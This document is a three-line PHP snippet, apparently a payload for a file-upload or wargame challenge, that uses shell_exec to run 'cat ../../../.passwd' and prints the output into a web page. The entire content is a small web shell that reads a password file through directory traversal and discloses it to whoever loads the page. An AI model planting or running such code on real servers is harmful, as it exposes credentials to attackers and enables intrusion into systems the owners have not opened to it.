<?php
		$result = shell_exec('cat ../../../.passwd');
		print "<p>$result</p>";